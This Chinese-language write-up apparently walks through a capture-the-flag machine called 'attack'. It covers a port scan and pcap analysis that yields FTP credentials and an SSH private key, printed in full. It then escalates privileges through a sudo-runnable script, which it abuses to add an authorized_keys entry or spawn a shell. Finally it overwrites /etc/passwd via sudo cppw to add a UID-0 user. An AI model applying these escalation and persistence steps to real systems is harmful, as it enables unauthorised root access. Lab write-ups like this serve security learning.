# attack

使用`rustscan`扫描

![](./img/attack-1.png)

发现打开了`21`、`22`、`80`端口,访问网页写着

> I did a capture with wireshark. The name of the file is "capture" but i dont remember the extension :(

## 流量分析

尝试访问`capture.pcapng`和`capture.pcap`，发现是`capture.pcap`，下载查看

`ftp`发现了用户名、密码和一个`mysecret.png`文件

![](./img/attack-3.png)



`web`访问`filexxx.zip`，解压给了个私钥

```
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
NhAAAAAwEAAQAAAQEAwvMkIShyNj4nrH/pkn0yW9emR7T8RjG8Om9slsCn/4cWKRQ4uxXb
GyECq1y9kApTSIZr7HQynFa0K5yoXw+GKBlexkaoyqLuhIfL9pMpjbzLQUSn3o3RMJstP0
u2LxlVnsM6FeDdx4csRo6soxoohxe3a0FlNlBosapIo2Dhd+CSR0HUr1Shd46aMfmODABg
+Fw91ob5LQSwnahrVpBmnkmnuHzn4AhuYbn+kjOt/LbO0K9wWbfrgWS9rM+wLiiolv48zD
iIzge63KLpKEFRoQ//d+9nZA5gtfmr9mRsrxVt6LffcYDDjs4T+UPCByGZfDp8k4DM7PW4
vjtFxsmggQAAA8iBo5LUgaOS1AAAAAdzc2gtcnNhAAABAQDC8yQhKHI2Piesf+mSfTJb16
ZHtPxGMbw6b2yWwKf/hxYpFDi7FdsbIQKrXL2QClNIhmvsdDKcVrQrnKhfD4YoGV7GRqjK
ou6Eh8v2kymNvMtBRKfejdEwmy0/S7YvGVWewzoV4N3HhyxGjqyjGiiHF7drQWU2UGixqk
ijYOF34JJHQdSvVKF3jpox+Y4MAGD4XD3WhvktBLCdqGtWkGaeSae4fOfgCG5huf6SM638
ts7Qr3BZt+uBZL2sz7AuKKiW/jzMOIjOB7rcoukoQVGhD/9372dkDmC1+av2ZGyvFW3ot9
9xgMOOzhP5Q8IHIZl8OnyTgMzs9bi+O0XGyaCBAAAAAwEAAQAAAQEAg9n4tKhrXr55DNVS
f25HshBPeS4ydbNLsGYOFoPk3BFcbporqHUmxNl1ubq2xwYEwAeSVNFeLZkCsIB67BhOzy
4hiI7fuHWsRlymGXX8480t1039D6vxMSOy3Z1ycbZ7zy4RShzVQw7sZig3IPUfNgdXWaZY
Mvz9YjRefomW1QEQ+LN4VZYltBDf75FGYFd6Lm/kLid+nEdkTmaC3yir63X4ctiBwDYNrn
24hxwiMm0+/6sDKu1Wx5CdmE1bguZUfhi45kyYk4ImcUCyytUtKo81FpmpYWxaU0dsey3z
DdZvhV5eeglk9r6KiZWAAflYPlaTm80J+9EP7rKc3fhGlQAAAIEAtLQ6wkfs94qprlRmC3
yzbSNmPmNT/lfrsrZLQHCYdBnD/1r2H0CMWl1pth+chRl9W1YAzkbKhHwm1YL4q+25Jduu
5228vid0jwK+0U0HZlNM0jJaOueLsqx339/FEe7aoeY0luTpSnjgRcVuioUMSUz6T282/8
/YahP2g+aL5HYAAACBAPuknKVKVgFzGwohXfKAL5ovzP1RqKhke7bBPJUvVc9maUJCeq5V
+bHQY8Dma2RNGD0bjNjMesGA4UlzcNPb8IhkrJAb5zflP3Kyzd5uxWKMuxEo3i/at5bvtT
8n79izUS+0GLVjtVvHWQMfqpGB8TGKLcNgENu6BXCYynsg+qaPAAAAgQDGUz2nJk3o5cBN
VnSuUCNOQStcXkoxLlWa6x1+6/IedoBMRmVCjPykewv8IxzFOJ+v6f4dYG3zm9OYHpQDio
90hcG7M9c6X2PaBB989J006avt+xNF7D2XTegoG+KkDVycWQIWmvjey2St1W8ch0iXuPK6
ZmoAGz9E8TWbR35P7wAAAAx0ZXN0ZUBhdHRhY2sBAgMEBQ==
-----END OPENSSH PRIVATE KEY-----
```

流量包导出的`filexxx.zip`给了张二维码

![](./img/attack-4.png)

扫描发现是

![](./img/attack-5.png)

```
http://localhost/jackobattack.txt
```

访问网页，看来是`jackob`的`ssh`私钥，尝试登录

![](./img/attack-6.png)

## 写私钥提权

```bash
ssh -i id_rsa jackob@192.168.1.144
```

![](./img/attack-7.png)

```bash
$ cat note.txt
I need to launch the script to start the attack planned by kratos.
```

意思是可以用`kratos`运行该脚本

```bash
jackob@attack:~$ cat attack.sh
#!/bin/bash
echo "[+] LAUNCHING ATTACK"
the9command="/usr/bin/id"
the2command="/usr/bin/ls"
the4command="/usr/bin/echo"
the3command="/usr/bin/uptime"
theOcommand="/usr/bin/echo"
the1command="/usr/bin/id"
the6Command="/usr/bin/echo"
the7command="/usr/bin/w"
the8command="/usr/bin/echo"
the5command="/usr/bin/id"

echo "[+] NEXT PHASE"
the10command="/usr/bin/id"
the20command="/usr/bin/echo"
the30command="/usr/bin/echo"
the40command="/usr/bin/w"
the50command="/usr/bin/echo"
the60command="/usr/bin/date"
the70command="/usr/bin/uptime"
the85command="/usr/bin/echo"

echo "[+] FINAL PHASE"
$the1command >> /tmp/a
$the2command >> /tmp/a
$the3command >> /tmp/b
$the4command >> /tmp/b
$the5command >> /tmp/c
$the6command >> /tmp/c
$the7command >> /tmp/d
$the8command >> /tmp/d
$the9command >> /tmp/f
$the0command >> /tmp/f
$the10command >> /tmp/g
$the20command >> /tmp/g
$the30command >> /tmp/h
$the40command >> /tmp/h
$the50command >> /tmp/r
$the60command > /tmp/r
$the70command > /tmp/w
$the85command > /tmp/z

echo "[+] DONE"
```

提权方式很多，提供两个思路

### 方式一：修改公钥

修改`jackob`的公钥命令到该文件

```bash
$ mv attack.sh attack.sh.bak
$ vi attack.sh
echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC3U7ZkA0vcE+QvfZGpaTc40YNiTDnwbIPauorRENFuUBOCj735WnLClq8Zu80YXVqmH0x/5Oafpv3nJDoaIBoNSu2JElctHX/bsVpyyWTyCtb7+4EVWi7i8EsHp7Fj/6ZuwFnHLnhGIqnZZVnego6BDfJsRZf0FUanR1F2nXoYmbINVwAxH6Dh1z8nQR7n1fyEqVXowKYaRNnX8Gf8ILPDO23cepNUIr/zpxB3MYZh40NJQpRhgTnVibTQ8tvzKEkF6UmFG52j7n10st0ZzJAyIINsGc7tv9FuFEdSeO65kdpWaQAazgUHBqEPNrVBgynUWzWyNsOHQj62ubhVyLap jackob@attack" >> /home/kratos/.ssh/authorized_keys
```

![](./img/attack-9.png)

### 方式二：shell

直接放`/usr/bin/bash`

```bash
$ mv attack.sh attack.sh.bak
$ vi attack.sh
/usr/bin/bash
$ chmod +x attack.sh
$ sudo -u kratos /home/jackob/attack.sh
```

![](./img/attack-8.png)

## cppw提权

现在已经提权到`kratos`

```bash
kratos@attack:~$ find / -perm -4000 2>/dev/null
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/su
/usr/bin/passwd
/usr/bin/umount
/usr/bin/sudo
/usr/bin/newgrp
/usr/bin/mount
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
```

没有可利用的，使用

```bash
$ sudo -l
Matching Defaults entries for kratos on attack:
    !env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User kratos may run the following commands on attack:
    (root) NOPASSWD: /usr/sbin/cppw
```

使用`cppw`提权,`cppw` 的作用是会覆盖 `/etc/passwd` 文件，因此请创建一个包含用户名、密码散列、`user_id`、`group_id` 和家目录的格式化文件。我复制了我的`root`用户密码散列并将其保存到文本文件中，然后执行了`cppw`二进制文件，这样它就将其保存到了`/etc/passwd`中，并进行了覆盖。

`/etc/passwd`里面的`root`是

```
root:x:0:0:root:/root:/bin/bash
```

其中`x`表示这个密码没有存储在`/etc/passwd`里面 存储在`/etc/shadow`里面

我们将`x`替换成我们已知的加密密码即可

但这个密码的加密方式应该是需要相同的，可以借用`openssl`生成

```bash
$ openssl passwd 111111
$1$xjlKD2QS$Rq/0wDMqYQjfAx9kFHjb91
```

在原有的`passwd`文件增加内容

```bash
$ cat /etc/passwd > passwd_file
# 追加root密码
$ echo 'cc:$1$xjlKD2QS$Rq/0wDMqYQjfAx9kFHjb91:0:0:xx:/root:/bin/bash' >> passwd_file
# 将passwd_file覆盖/etc/passwd
$ sudo /usr/sbin/cppw passwd_file
# 切换到cc用户，获得`root`权限
$ su - cc
Password: 11111
root@attack:~# whoami
root
```

